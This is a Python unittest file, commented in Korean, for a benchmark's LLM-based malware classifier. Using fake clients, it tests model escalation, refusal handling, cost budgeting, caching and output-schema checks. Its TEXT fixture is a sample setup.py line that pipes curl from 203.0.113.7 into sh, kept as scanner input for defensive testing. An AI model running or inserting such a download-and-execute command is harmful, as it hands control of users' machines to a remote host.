"""평가 규칙 v2 LLM 층 점검(가짜 클라이언트 — 실제 호출 없음 · 비용 0) — python3 -B -m unittest discover -s bench/v2 -p 'test_*.py'

SDK(anthropic)가 없으면 SDK 가 필요한 시험만 건너뛴다(CI 는 표준 라이브러리만 있다).
SDK 시험도 실제 API 로 나가지 않는다 — 이 PC 의 127.0.0.1 에 띄운 가짜 서버로만 보낸다.
"""
import contextlib
import hashlib
import http.server
import inspect
import io
import json
import math
import os
import sys
import tempfile
import threading
import types
import unittest
from unittest import mock

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
import llm_layer as L  # noqa: E402

HAIKU, OPUS = L.STAGE1_MODEL, L.STAGE2_MODEL
NEEDS_SDK = unittest.skipIf(L.anthropic is None, "anthropic SDK 없음 — bench/v2/requirements-llm.txt 를 설치하면 돈다")
# 프롬프트는 판마다 고정이다. 고치려면 새 판 파일(package-v3.json …)을 만들고 이 값들은 그대로 둔다
PROMPT_V1_SHA256 = "bf23688a4e89e1795424db334d32bf31bbe8a78a9021d936c9c8c78f5ec762ce"
PROMPT_V2_SHA256 = "e2ef027bd78ec72213907b102c06d4a3482369d97ee018b6af1123950d635b4e"
TRIES = 1 + 3  # 첫 시도 + 같은 요청 다시 시도 3번(사용자 결정 11/13)
STATIC = {"verdict": "suspicious", "score": 6, "rules": ["threat-setup-exec"]}
TEXT = "=== setup.py ===\nimport os\nos.system('curl http://203.0.113.7/x | sh')\n"
FAKE_KEY = "sk-ant-test-THIS-IS-NOT-A-REAL-KEY-0123456789"


def analysis(score=5, **over):
    """스키마에 맞는 분석 하나(모델이 돌려주는 snake_case 모양)."""
    base = {
        "risk_score": score,
        "risk_level": "HIGH" if score >= 70 else "MEDIUM" if score >= 40 else "LOW",
        "detected_tags": ["DOWNLOAD_EXECUTE"] if score >= 40 else ["NONE"],
        "attack_narrative_ko": "설치 스크립트가 밖에서 받은 것을 바로 실행한다",
        "evidence": [{"file": "setup.py", "line_hint": "os.system('curl", "reason_ko": "내려받아 실행"}],
        "benign_explanation_ko": None,
        "confidence": 80,
        "recommended_action_ko": "설치하지 않는다",
        "rationale_ko": "setup.py 가 설치 중에 밖에서 받은 스크립트를 셸로 실행합니다.",
    }
    return {**base, **over}


def usage(inp=2000, out=300, read=0, write=0):
    return types.SimpleNamespace(input_tokens=inp, output_tokens=out, cache_read_input_tokens=read, cache_creation_input_tokens=write)


def message(body=None, *, text=None, stop="end_turn", category=None, use=None, thinking=True):
    """SDK Message 를 닮은 가짜. body 는 JSON 글 블록이 된다. 앞에는 빈 생각 블록 — 두 모델 모두 생각이 기본으로 켜져 있다."""
    content = [types.SimpleNamespace(type="thinking", thinking="", signature="sig")] if thinking else []
    if text is None and body is not None:
        text = json.dumps(body, ensure_ascii=False)
    if text is not None:
        content.append(types.SimpleNamespace(type="text", text=text))
    details = types.SimpleNamespace(type="refusal", category=category, explanation="declined") if stop == "refusal" else None
    return types.SimpleNamespace(content=content, stop_reason=stop, stop_details=details, usage=use or usage())


def refusal(category="cyber"):
    """출력 전에 거부된 답: 내용 없음 · 출력 토큰 0."""
    return message(stop="refusal", category=category, thinking=False, use=usage(out=0))


class ApiError(Exception):
    """SDK 의 APIStatusError 를 닮은 가짜(상태 코드 · message)."""

    def __init__(self, status, text="boom"):
        super().__init__(text)
        self.status_code, self.message = status, text


class _Stream:
    def __init__(self, reply):
        self.reply = reply

    def __enter__(self):
        if isinstance(self.reply, BaseException):
            raise self.reply
        return self

    def __exit__(self, *exc):
        return False

    def get_final_message(self):
        return self.reply


class FakeClient:
    """client.messages.stream · count_tokens · batches(create · retrieve · results) 만 있는 가짜.
    replies = {모델: 답 | [답, …](차례로) | 함수(요청)}. 답이 예외면 던진다(배치에서는 errored 결과). 배치에서는 "expired" · "canceled" 글도 답이다.
    count = 토큰 세기가 돌려줄 수(None 이면 실패). server = 배치 저장소(FakeBatches) — 두 실행이 같은 「서버」를 보게 할 때 넘긴다."""

    def __init__(self, replies, count=None, *, server=None, ends_after=0):
        self.replies, self.count = replies, count
        self.calls, self.counted = [], []
        self.messages = self
        self.batches = server or FakeBatches(ends_after=ends_after)
        self.batches.owner = self

    def reply_for(self, request):
        self.calls.append(request)
        reply = self.replies[request["model"]]
        if isinstance(reply, list):
            reply = reply.pop(0)
        elif callable(reply):
            reply = reply(request)
        return reply

    def stream(self, **request):
        return _Stream(self.reply_for(request))

    def count_tokens(self, **request):
        self.counted.append(request)
        if self.count is None:
            raise ApiError(500, "count unavailable")
        return types.SimpleNamespace(input_tokens=self.count)

    def models(self):
        return [c["model"] for c in self.calls]


class FakeBatches:
    """Message Batches 를 닮은 가짜 서버. 결과는 요청 순서를 뒤집어 돌려준다(짝은 custom_id 로만 맞춰야 한다).
    ends_after = 몇 번 상태를 물어야 끝나는지(0 이면 첫 조회에 ended)."""

    def __init__(self, ends_after=0):
        self.ends_after, self.owner = ends_after, None
        self.created, self.retrieved, self.store = [], [], {}

    def create(self, *, requests):
        requests = [dict(r) for r in requests]
        batch_id = f"msgbatch_{len(self.store) + 1:03d}"
        self.created.append((batch_id, requests))
        self.store[batch_id] = {"requests": requests, "polls": 0, "results": None}
        return types.SimpleNamespace(id=batch_id, processing_status="in_progress")

    def retrieve(self, batch_id):
        self.retrieved.append(batch_id)
        entry = self.store[batch_id]
        entry["polls"] += 1
        return types.SimpleNamespace(id=batch_id, processing_status="ended" if entry["polls"] > self.ends_after else "in_progress")

    def results(self, batch_id):
        entry = self.store[batch_id]
        if entry["results"] is None:  # 서버는 한 번 만든 결과를 그대로 준다(다시 받아도 같다)
            entry["results"] = [types.SimpleNamespace(custom_id=r["custom_id"], result=as_result(self.owner.reply_for(r["params"])))
                                for r in entry["requests"]]
        return list(reversed(entry["results"]))


def as_result(reply):
    if isinstance(reply, str):
        return types.SimpleNamespace(type=reply)
    if isinstance(reply, BaseException):
        inner = types.SimpleNamespace(type="api_error", message=str(reply))
        return types.SimpleNamespace(type="errored", error=types.SimpleNamespace(type="error", error=inner))
    return types.SimpleNamespace(type="succeeded", message=reply)


def gate_all():
    return L.Gate("all")


def one(client, sample_id="s1", text=TEXT, static=STATIC, *, budget=None, cache=None, **kw):
    return L.analyze_one(sample_id, text, static, client=client, budget=budget or L.Budget(100.0), cache=cache, **kw)


def haiku_worst(text=TEXT, static=STATIC):
    """Haiku 호출 한 번에 예산이 잡는 금액(바이트 수 어림 기준)."""
    prompt = L.load_prompt()
    request = L.build_request(HAIKU, prompt, L.render_user(prompt, text, static, False))
    return L.worst_case_usd(HAIKU, L.bound_input_tokens(request))


def write_jsonl(path, rows):
    with open(path, "w", encoding="utf-8") as f:
        for r in rows:
            f.write(json.dumps(r, ensure_ascii=False) + "\n")


def samples(n, prefix="s"):
    """내용이 저마다 다른 표본 n 개(캐시에 걸리지 않게)."""
    return [{"id": f"{prefix}{i}", "text": f"{TEXT}# {prefix}{i}\n", "static": STATIC} for i in range(n)]


def batch(rows, client, results, *, limit_usd=100.0, cache=None, gate=None, **kw):
    """실시간 경로로 차례로 돈다(개발용 · 이전 이름 run_batch)."""
    return L.run_realtime(rows, results=results, client=client, budget=L.Budget(limit_usd, results.spent), cache=cache,
                          prompt=L.load_prompt(), gate=gate or gate_all(), **kw)


def batches(rows, client, results, *, limit_usd=100.0, cache=None, gate=None, state=None, wait=True, **kw):
    """배치 경로(측정 기본) → (결과, 예산). state = 상태 파일 경로(없으면 결과 파일 옆)."""
    budget = L.Budget(limit_usd, results.spent)
    done = L.run_batches(rows, results=results, client=client, budget=budget, cache=cache, prompt=L.load_prompt(),
                         gate=gate or gate_all(), state_path=state or results.path + ".batches.json", wait=wait, poll=0,
                         sleep=lambda seconds: None, **kw)
    return done, budget


def write_split(path, assignments):
    """가짜 분할 파일(split.json 모양의 일부) — 실제 분할은 읽지 않는다."""
    with open(path, "w", encoding="utf-8") as f:
        json.dump({"sealed": ["test", "reserve"], "assignments": assignments}, f)


class Staging(unittest.TestCase):
    def test_low_score_ends_on_stage_one(self):
        client = FakeClient({HAIKU: message(analysis(5))})
        row = one(client)
        self.assertEqual(client.models(), [HAIKU])
        self.assertEqual((row["status"], row["model"], row["riskScore"]), ("OK", HAIKU, 5))
        self.assertEqual((row["tags"], row["confidence"], row["error"]), (["NONE"], 80, None))
        self.assertEqual([s["model"] for s in row["stages"]], [HAIKU])
        # 긴 칸은 analysis 아래에, 키는 camelCase
        self.assertEqual(row["analysis"]["riskLevel"], "LOW")
        self.assertIn("attackNarrativeKo", row["analysis"])
        self.assertEqual(row["analysis"]["evidence"][0], {"file": "setup.py", "lineHint": "os.system('curl", "reasonKo": "내려받아 실행"})
        self.assertNotIn("evidence", row)

    def test_score_at_the_threshold_goes_to_stage_two(self):
        self.assertEqual(L.ESCALATE_SCORE, 40)
        client = FakeClient({HAIKU: message(analysis(40)), OPUS: message(analysis(88, detected_tags=["C2_CONNECTION", "ENV_EXFILTRATION"]))})
        row = one(client)
        self.assertEqual(client.models(), [HAIKU, OPUS])
        self.assertEqual((row["status"], row["model"], row["riskScore"]), ("OK", OPUS, 88))
        self.assertEqual(row["tags"], ["C2_CONNECTION", "ENV_EXFILTRATION"])
        self.assertEqual([(s["model"], s["status"], s["riskScore"]) for s in row["stages"]], [(HAIKU, "OK", 40), (OPUS, "OK", 88)])
        just_below = FakeClient({HAIKU: message(analysis(39))})
        self.assertEqual(one(just_below)["model"], HAIKU)
        self.assertEqual(just_below.models(), [HAIKU])

    def test_stage_two_sees_the_same_prompt_and_input(self):
        client = FakeClient({HAIKU: message(analysis(70)), OPUS: message(analysis(70))})
        one(client)
        first, second = client.calls
        self.assertEqual(first["system"], second["system"])
        self.assertEqual(first["messages"], second["messages"])

    def test_refusal_on_stage_one_goes_to_stage_two(self):
        client = FakeClient({HAIKU: refusal(), OPUS: message(analysis(77))})
        row = one(client)
        self.assertEqual(client.models(), [HAIKU, OPUS])
        self.assertEqual((row["status"], row["model"], row["riskScore"]), ("OK", OPUS, 77))
        self.assertEqual((row["stages"][0]["status"], row["stages"][0]["riskScore"], row["stages"][0]["error"]), ("REFUSED", None, "refusal:cyber"))

    def test_failed_stage_two_keeps_the_stage_one_result(self):
        for second, status, tries in ((ApiError(500), "ERROR", TRIES), (refusal(), "REFUSED", 1), (message(text="not json"), "ERROR", TRIES)):
            with self.subTest(second=status):
                client = FakeClient({HAIKU: message(analysis(55)), OPUS: second})
                row = one(client)
                self.assertEqual(client.models(), [HAIKU] + [OPUS] * tries)  # 오류는 같은 요청을 다시, 거부는 다시 하지 않는다
                self.assertEqual((row["status"], row["model"], row["riskScore"], row["error"]), ("OK", HAIKU, 55, None))
                self.assertEqual(row["stages"][-1]["status"], status)
                self.assertIsNotNone(row["stages"][-1]["error"])

    def test_refused_by_both_has_no_score(self):
        row = one(FakeClient({HAIKU: refusal("cyber"), OPUS: refusal("cyber")}))
        self.assertEqual((row["status"], row["riskScore"], row["tags"], row["confidence"], row["analysis"]), ("REFUSED", None, [], None, None))
        self.assertEqual(row["error"], "refusal:cyber")

    def test_stage_one_error_is_an_error_without_stage_two(self):
        client = FakeClient({HAIKU: ApiError(529, "overloaded")})
        row = one(client)
        self.assertEqual(client.models(), [HAIKU] * TRIES)
        self.assertEqual((row["status"], row["riskScore"], row["model"]), ("ERROR", None, HAIKU))
        self.assertIn("529", row["error"])

    def test_answer_is_read_by_block_type_not_position(self):
        # 생각 블록이 여러 개 앞서도 글 블록을 찾는다
        reply = message(analysis(12))
        reply.content.insert(0, types.SimpleNamespace(type="thinking", thinking="", signature="s2"))
        self.assertEqual(one(FakeClient({HAIKU: reply}))["riskScore"], 12)


class Cost(unittest.TestCase):
    def test_all_four_token_kinds_are_priced(self):
        u = {"inputTokens": 1000, "outputTokens": 500, "cacheReadTokens": 2000, "cacheWriteTokens": 3000}
        self.assertAlmostEqual(L.cost_usd(OPUS, u), (1000 * 4.00 + 500 * 20.00 + 2000 * 0.20 + 3000 * 5.00) / 1e6, places=12)
        self.assertAlmostEqual(L.cost_usd(HAIKU, u), (1000 * 0.10 + 500 * 0.50 + 2000 * 0.01 + 3000 * 0.125) / 1e6, places=12)

    def test_haiku_prompt_over_100k_tokens_pays_the_higher_card(self):
        # 프롬프트 길이 = 입력 + 캐시 읽기 + 캐시 쓰기. 딱 10만은 낮은 요금표, 하나라도 넘으면 요청 전체가 높은 요금표
        at = {"inputTokens": 60_000, "outputTokens": 1000, "cacheReadTokens": 30_000, "cacheWriteTokens": 10_000}
        over = {**at, "cacheWriteTokens": 10_001}
        self.assertAlmostEqual(L.cost_usd(HAIKU, at), (60_000 * 0.10 + 1000 * 0.50 + 30_000 * 0.01 + 10_000 * 0.125) / 1e6, places=12)
        self.assertAlmostEqual(L.cost_usd(HAIKU, over), (60_000 * 0.50 + 1000 * 2.50 + 30_000 * 0.05 + 10_001 * 0.625) / 1e6, places=12)
        # Opus 는 길이와 상관없이 한 요금표
        big = {"inputTokens": 500_000, "outputTokens": 0, "cacheReadTokens": 0, "cacheWriteTokens": 0}
        self.assertAlmostEqual(L.cost_usd(OPUS, big), 2.0, places=12)

    def test_a_model_without_a_price_is_refused(self):
        with self.assertRaises(KeyError):
            L.cost_usd("claude-unknown-9", {"inputTokens": 1, "outputTokens": 1, "cacheReadTokens": 0, "cacheWriteTokens": 0})
        self.assertEqual(set(L.PRICES), {HAIKU, OPUS})

    def test_row_cost_is_the_sum_of_stage_costs_from_usage(self):
        u1, u2 = usage(inp=900, out=321, write=1500), usage(inp=900, out=654, read=1500)
        budget = L.Budget(100.0)
        row = one(FakeClient({HAIKU: message(analysis(55), use=u1), OPUS: message(analysis(91), use=u2)}), budget=budget)
        s1, s2 = row["stages"]
        self.assertEqual((s1["inputTokens"], s1["outputTokens"], s1["cacheReadTokens"], s1["cacheWriteTokens"]), (900, 321, 0, 1500))
        self.assertEqual((s2["inputTokens"], s2["outputTokens"], s2["cacheReadTokens"], s2["cacheWriteTokens"]), (900, 654, 1500, 0))
        self.assertAlmostEqual(s1["costUsd"], (900 * 0.10 + 321 * 0.50 + 1500 * 0.125) / 1e6, places=8)
        self.assertAlmostEqual(s2["costUsd"], (900 * 4.00 + 654 * 20.00 + 1500 * 0.20) / 1e6, places=8)
        self.assertAlmostEqual(row["costUsd"], s1["costUsd"] + s2["costUsd"], places=8)
        # 잡아 둔 몫은 풀리고 실제 비용만 남는다
        self.assertAlmostEqual(budget.spent, row["costUsd"], places=8)
        self.assertAlmostEqual(budget.held, 0.0, places=12)

    def test_failed_calls_still_cost_what_usage_says(self):
        row = one(FakeClient({HAIKU: message(text="not json", use=usage(inp=5000, out=100))}))
        self.assertEqual(row["status"], "ERROR")
        self.assertAlmostEqual(row["costUsd"], TRIES * (5000 * 0.10 + 100 * 0.50) / 1e6, places=8)  # 다시 한 것도 쓴 돈이다

    def test_refusal_before_output_counts_against_the_cap_and_is_flagged_when_unbilled(self):
        # 문서(2026-11-12): 출력 전 거부는 bio · frontier_llm · reasoning_extraction 만 청구. 상한 계산에는 보수적으로 모두 더하고 표시만 남긴다
        cyber = one(FakeClient({HAIKU: refusal("cyber"), OPUS: refusal(None)}))
        self.assertEqual([s.get("billed") for s in cyber["stages"]], [False, False])
        self.assertGreater(cyber["costUsd"], 0)
        bio = one(FakeClient({HAIKU: refusal("bio"), OPUS: message(analysis(3))}))
        self.assertNotIn("billed", bio["stages"][0])
        # 출력이 나온 뒤의 거부는 청구된다
        mid = message(text="{\"risk", stop="refusal", category="cyber", use=usage(out=40))
        self.assertNotIn("billed", one(FakeClient({HAIKU: mid, OPUS: message(analysis(3))}))["stages"][0])

    def test_call_that_never_reported_usage_is_marked(self):
        class Dropped(Exception):
            pass
        row = one(FakeClient({HAIKU: Dropped("connection reset")}))
        self.assertEqual((row["status"], row["costUsd"]), ("ERROR", 0.0))
        self.assertTrue(all(s["costUnknown"] for s in row["stages"]))
        # 상태 코드가 있는 오류는 서버가 요청을 받지 않은 것 — 표시하지 않는다
        self.assertNotIn("costUnknown", one(FakeClient({HAIKU: ApiError(400)}))["stages"][0])


class BudgetCap(unittest.TestCase):
    def test_default_cap_is_100_dollars(self):
        self.assertEqual(L.BUDGET_USD, 100.0)
        self.assertEqual(L.Budget().limit, 100.0)

    def test_worst_case_prices_all_input_at_the_dearest_rate_and_a_full_output(self):
        self.assertAlmostEqual(L.worst_case_usd(OPUS, 10_000), (10_000 * 5.00 + L.MAX_TOKENS * 20.00) / 1e6, places=12)
        self.assertAlmostEqual(L.worst_case_usd(HAIKU, 10_000), (10_000 * 0.125 + L.MAX_TOKENS * 0.50) / 1e6, places=12)
        self.assertAlmostEqual(L.worst_case_usd(HAIKU, 100_001), (100_001 * 0.625 + L.MAX_TOKENS * 2.50) / 1e6, places=12)

    def test_token_bound_is_at_least_the_bytes_sent(self):
        prompt = L.load_prompt()
        user = L.render_user(prompt, "가나다" * 100, STATIC, False)
        request = L.build_request(HAIKU, prompt, user)
        self.assertGreaterEqual(L.bound_input_tokens(request), len(prompt["system"].encode()) + len(user.encode()))

    def test_stops_before_the_cap_and_marks_the_rest_skipped(self):
        worst = haiku_worst()
        budget = L.Budget(worst)  # 딱 한 번 부를 만큼
        client = FakeClient({HAIKU: [message(analysis(5)), message(analysis(5))]})
        first = one(client, "a", budget=budget)
        second = one(client, "b", budget=budget)
        self.assertEqual(first["status"], "OK")
        self.assertEqual((second["status"], second["riskScore"], second["costUsd"], second["model"]), ("SKIPPED_BUDGET", None, 0.0, None))
        self.assertEqual([(s["model"], s["status"], s["costUsd"]) for s in second["stages"]], [(HAIKU, "SKIPPED_BUDGET", 0.0)])
        self.assertEqual(len(client.calls), 1)  # 두 번째는 부르지 않았다
        self.assertLessEqual(budget.spent, budget.limit)
        self.assertGreater(budget.spent + worst, budget.limit)  # 불렀다면 넘을 수 있었다

    def test_tokens_are_counted_only_near_the_cap(self):
        worst = haiku_worst()
        # 넉넉할 때는 세지 않는다
        roomy = FakeClient({HAIKU: message(analysis(5))}, count=100)
        one(roomy)
        self.assertEqual(roomy.counted, [])
        # 바이트 수 어림으로는 모자라지만 센 값으로는 들어가면 부른다
        tight = L.worst_case_usd(HAIKU, math.ceil(100 * 1.05) + 256)
        self.assertLess(tight, worst)
        near = FakeClient({HAIKU: message(analysis(5))}, count=100)
        row = one(near, budget=L.Budget((worst + tight) / 2))
        self.assertEqual(row["status"], "OK")
        self.assertEqual(len(near.counted), 1)
        counted = near.counted[0]
        self.assertEqual((counted["model"], counted["system"], counted["messages"]), (HAIKU, near.calls[0]["system"], near.calls[0]["messages"]))
        self.assertNotIn("max_tokens", counted)
        # 세지 못하면(오류) 보수적으로 부르지 않는다
        blind = FakeClient({HAIKU: message(analysis(5))}, count=None)
        self.assertEqual(one(blind, budget=L.Budget((worst + tight) / 2))["status"], "SKIPPED_BUDGET")
        self.assertEqual(blind.calls, [])

    def test_no_count_request_once_even_the_output_share_does_not_fit(self):
        client = FakeClient({HAIKU: message(analysis(5))}, count=1)
        row = one(client, budget=L.Budget(L.worst_case_usd(HAIKU, 0) / 2))
        self.assertEqual(row["status"], "SKIPPED_BUDGET")
        self.assertEqual((client.calls, client.counted), ([], []))

    def test_stage_two_skipped_for_budget_keeps_the_stage_one_result(self):
        client = FakeClient({HAIKU: message(analysis(60)), OPUS: message(analysis(95))}, count=1)
        budget = L.Budget(0.05)  # Haiku 는 되지만 Opus 는 출력 몫($0.32)만으로도 넘는다
        row = one(client, budget=budget)
        self.assertEqual(client.models(), [HAIKU])
        self.assertEqual((row["status"], row["model"], row["riskScore"]), ("OK", HAIKU, 60))
        self.assertEqual([(s["model"], s["status"]) for s in row["stages"]], [(HAIKU, "OK"), (OPUS, "SKIPPED_BUDGET")])
        self.assertLessEqual(budget.spent, budget.limit)


class Resume(unittest.TestCase):
    def setUp(self):
        self.dir = tempfile.TemporaryDirectory()
        self.addCleanup(self.dir.cleanup)
        self.out = os.path.join(self.dir.name, "out.jsonl")

    def test_interrupted_run_keeps_the_spent_total_and_the_cap(self):
        rows = samples(5)
        per_call = L.cost_usd(HAIKU, {"inputTokens": 2000, "outputTokens": 300, "cacheReadTokens": 0, "cacheWriteTokens": 0})
        limit = 2 * per_call + haiku_worst(rows[4]["text"]) + per_call / 2  # 두 실행을 합쳐 딱 세 번 부를 만큼

        def third_call_is_interrupted(request, seen=[]):  # noqa: B006 — 호출 횟수를 세는 용도
            seen.append(1)
            if len(seen) == 3:
                raise KeyboardInterrupt
            return message(analysis(5))

        first = FakeClient({HAIKU: third_call_is_interrupted})
        with self.assertRaises(KeyboardInterrupt):
            batch(rows, first, L.Results(self.out), limit_usd=limit)

        # 새 프로세스처럼: 결과 파일에서 다시 읽는다
        again = L.Results(self.out)
        self.assertEqual(list(again.rows), ["s0", "s1"])
        self.assertAlmostEqual(again.spent, 2 * per_call, places=8)
        second = FakeClient({HAIKU: lambda request: message(analysis(5))})
        done = batch(rows, second, again, limit_usd=limit)
        self.assertEqual(len(second.calls), 1)  # 앞 실행의 두 번에 더해 한 번만
        self.assertEqual(done["made"], 3)
        final = L.Results(self.out)
        self.assertEqual([final.rows[r["id"]]["status"] for r in rows], ["OK", "OK", "OK", "SKIPPED_BUDGET", "SKIPPED_BUDGET"])
        self.assertAlmostEqual(final.spent, 3 * per_call, places=8)
        self.assertLessEqual(final.spent, limit)

    def test_finished_ids_are_skipped_and_failed_ones_tried_again(self):
        rows = samples(4)
        old = [
            {"id": "s0", "status": "OK", "riskScore": 9, "costUsd": 0.002, "cacheKey": "k0", "stages": []},
            {"id": "s1", "status": "ERROR", "riskScore": None, "costUsd": 0.001, "cacheKey": "k1", "stages": []},
            {"id": "s2", "status": "SKIPPED_BUDGET", "riskScore": None, "costUsd": 0.0, "cacheKey": "k2", "stages": []},
            {"id": "s3", "status": "REFUSED", "riskScore": None, "costUsd": 0.0, "cacheKey": "k3", "stages": []},
        ]
        write_jsonl(self.out, old)
        results = L.Results(self.out)
        client = FakeClient({HAIKU: lambda request: message(analysis(7))})
        batch(rows, client, results)
        self.assertEqual(len(client.calls), 2)  # s1 · s2 만
        final = L.Results(self.out)
        self.assertEqual({k: v["status"] for k, v in final.rows.items()}, {"s0": "OK", "s1": "OK", "s2": "OK", "s3": "REFUSED"})
        self.assertEqual(final.rows["s0"]["riskScore"], 9)  # 끝난 것은 그대로
        # 지난 실패 줄의 비용도 누적에 남는다
        self.assertAlmostEqual(final.spent, 0.003 + final.rows["s1"]["costUsd"] + final.rows["s2"]["costUsd"], places=8)

    def test_a_repeated_budget_skip_is_not_written_twice(self):
        rows = samples(2)
        for _ in range(3):
            batch(rows, FakeClient({HAIKU: message(analysis(5))}), L.Results(self.out), limit_usd=0.0)
        with open(self.out, encoding="utf-8") as f:
            lines = [json.loads(x) for x in f]
        self.assertEqual([(r["id"], r["status"]) for r in lines], [("s0", "SKIPPED_BUDGET"), ("s1", "SKIPPED_BUDGET")])

    def test_a_torn_last_line_is_dropped_and_reported(self):
        write_jsonl(self.out, [{"id": "s0", "status": "OK", "riskScore": 1, "costUsd": 0.25, "cacheKey": "k", "stages": []}])
        with open(self.out, "a", encoding="utf-8") as f:
            f.write('{"id": "s1", "status": "OK", "costUsd": 0.5')  # 쓰다 끊긴 줄
        results = L.Results(self.out)
        self.assertEqual((list(results.rows), results.spent, results.torn), (["s0"], 0.25, 1))
        # 끊긴 줄 뒤에 덧붙여도 새 줄은 온전히 읽힌다
        results.add({"id": "s2", "status": "OK", "riskScore": 2, "costUsd": 0.125, "cacheKey": "k2", "stages": []})
        again = L.Results(self.out)
        self.assertEqual((list(again.rows), again.spent, again.torn), (["s0", "s2"], 0.375, 1))

    def test_limit_stops_after_n_new_rows(self):
        done = batch(samples(5), FakeClient({HAIKU: lambda request: message(analysis(5))}), L.Results(self.out), limit=2)
        self.assertEqual((done["made"], len(L.Results(self.out).rows)), (2, 2))

    def test_run_stops_when_a_model_keeps_failing(self):
        # 정밀 모델이 계속 실패하면(권한 없음 등) 1단계 결과만으로 끝까지 가지 않고 멈춘다
        client = FakeClient({HAIKU: lambda request: message(analysis(80)), OPUS: lambda request: ApiError(403, "no access")})
        done = batch(samples(20), client, L.Results(self.out), max_errors=3)
        self.assertEqual(client.models().count(OPUS), 3 * TRIES)  # 표본마다 다시 시도까지 다 한 뒤의 최종 상태로 센다
        self.assertEqual(done["made"], 3)
        self.assertIn(OPUS, done["stopped"])
        # 사이에 성공이 끼면 다시 센다
        flaky = FakeClient({HAIKU: [ApiError(500), message(analysis(5)), ApiError(500), message(analysis(5))]})
        out2 = os.path.join(self.dir.name, "out2.jsonl")
        self.assertIsNone(batch(samples(4), flaky, L.Results(out2), max_errors=2)["stopped"])


class Cache(unittest.TestCase):
    def test_same_input_is_answered_from_cache_without_a_call(self):
        client = FakeClient({HAIKU: [message(analysis(22)), message(analysis(33))]})
        cache = {}
        a = one(client, "a", cache=cache)
        b = one(client, "b", cache=cache)
        self.assertEqual(len(client.calls), 1)
        self.assertEqual((b["status"], b["riskScore"], b["tags"], b["model"], b["costUsd"], b["stages"]), ("CACHED", 22, a["tags"], HAIKU, 0.0, []))
        self.assertEqual((b["id"], b["cachedFrom"], b["analysis"]), ("b", "a", a["analysis"]))
        self.assertEqual((a["cacheKey"], a["inputSha256"]), (b["cacheKey"], b["inputSha256"]))
        # 글이나 정적 요약이 다르면 다시 부른다
        c = one(client, "c", text=TEXT + "print(1)\n", cache=cache)
        self.assertEqual((c["status"], c["riskScore"], len(client.calls)), ("OK", 33, 2))

    def test_cache_off_calls_every_time(self):
        client = FakeClient({HAIKU: [message(analysis(22)), message(analysis(22))]})
        self.assertEqual([one(client, i, cache=None)["status"] for i in ("a", "b")], ["OK", "OK"])
        self.assertEqual(len(client.calls), 2)

    def test_only_ok_results_are_reused(self):
        client = FakeClient({HAIKU: [ApiError(500), refusal(), message(analysis(5))], OPUS: refusal()})
        cache = {}
        self.assertEqual([one(client, i, cache=cache, retries=0)["status"] for i in ("a", "b", "c")], ["ERROR", "REFUSED", "OK"])
        self.assertEqual(client.models().count(HAIKU), 3)

    def test_key_covers_models_prompt_and_input(self):
        key = L.cache_key("p" * 64, "i" * 64)
        self.assertEqual(len(key), 64)
        self.assertNotEqual(key, L.cache_key("q" * 64, "i" * 64))
        self.assertNotEqual(key, L.cache_key("p" * 64, "j" * 64))
        self.assertNotEqual(key, L.cache_key("p" * 64, "i" * 64, pipeline=L.PIPELINE.replace(OPUS, "claude-other")))
        for part in (HAIKU, OPUS, f">={L.ESCALATE_SCORE}", L.EFFORT[HAIKU], L.EFFORT[OPUS]):
            self.assertIn(part, L.PIPELINE)

    def test_static_summary_key_order_does_not_change_the_input_hash(self):
        client = FakeClient({HAIKU: lambda request: message(analysis(5))})
        a = one(client, static={"score": 6, "verdict": "suspicious"})
        b = one(client, static={"verdict": "suspicious", "score": 6})
        self.assertEqual(a["inputSha256"], b["inputSha256"])
        self.assertEqual(a["inputSha256"], hashlib.sha256(client.calls[0]["messages"][0]["content"].encode()).hexdigest())

    def test_results_file_serves_as_the_cache_on_the_next_run(self):
        with tempfile.TemporaryDirectory() as d:
            out = os.path.join(d, "out.jsonl")
            first = L.Results(out)
            batch([{"id": "a", "text": TEXT, "static": STATIC}], FakeClient({HAIKU: message(analysis(22))}), first, cache=first.cache())
            again = L.Results(out)
            nobody = FakeClient({})  # 부르면 KeyError
            batch([{"id": "b", "text": TEXT, "static": STATIC}], nobody, again, cache=again.cache())
            row = L.Results(out).rows["b"]
            self.assertEqual((row["status"], row["riskScore"], row["costUsd"]), ("CACHED", 22, 0.0))
            self.assertAlmostEqual(L.Results(out).spent, first.rows["a"]["costUsd"], places=8)


class Schema(unittest.TestCase):
    def test_answers_off_the_schema_are_errors(self):
        good = analysis(30)
        missing = {k: v for k, v in good.items() if k != "confidence"}
        bad = {
            "글이 JSON 이 아님": message(text="위험해 보입니다"),
            "객체가 아님": message(text="[1, 2]"),
            "칸 빠짐": message(missing),
            "점수 범위 밖": message(analysis(30, risk_score=150)),
            "점수가 음수": message(analysis(30, risk_score=-1)),
            "점수가 글": message(analysis(30, risk_score="high")),
            "점수가 참거짓": message(analysis(30, risk_score=True)),
            "점수가 소수": message(analysis(30, risk_score=30.5)),
            "없는 등급": message(analysis(30, risk_level="CRITICAL")),
            "없는 태그": message(analysis(30, detected_tags=["MADE_UP"])),
            "태그가 목록이 아님": message(analysis(30, detected_tags="NONE")),
            "근거 모양": message(analysis(30, evidence=[{"file": "a.py"}])),
            "확신도 범위 밖": message(analysis(30, confidence=101)),
            "모르는 칸": message({**good, "extra": 1}),
            "글 블록 없음": message(None),
            "근거 문장 없음": message({k: v for k, v in good.items() if k != "rationale_ko"}),
            "근거 문장이 빔": message(analysis(30, rationale_ko="  ")),
            "근거 문장이 글이 아님": message(analysis(30, rationale_ko=None)),
        }
        for name, reply in bad.items():
            with self.subTest(name):
                client = FakeClient({HAIKU: reply})
                row = one(client, retries=0)
                self.assertEqual((row["status"], row["riskScore"], row["tags"], row["analysis"]), ("ERROR", None, [], None))
                self.assertTrue(row["error"])
                self.assertEqual(client.models(), [HAIKU])  # 오류는 2단계로 올리지 않는다
                self.assertGreater(row["costUsd"], 0)  # 쓴 토큰은 센다

    def test_output_cut_at_max_tokens_is_an_error(self):
        row = one(FakeClient({HAIKU: message(text='{"risk_score": 9', stop="max_tokens")}))
        self.assertEqual(row["status"], "ERROR")
        self.assertIn("max_tokens", row["error"])

    def test_evidence_past_eight_is_cut_not_rejected(self):
        many = [{"file": f"f{i}.py", "line_hint": "x", "reason_ko": "y"} for i in range(11)]
        row = one(FakeClient({HAIKU: message(analysis(10, evidence=many))}))
        self.assertEqual(row["status"], "OK")
        self.assertEqual([e["file"] for e in row["analysis"]["evidence"]], [f"f{i}.py" for i in range(8)])

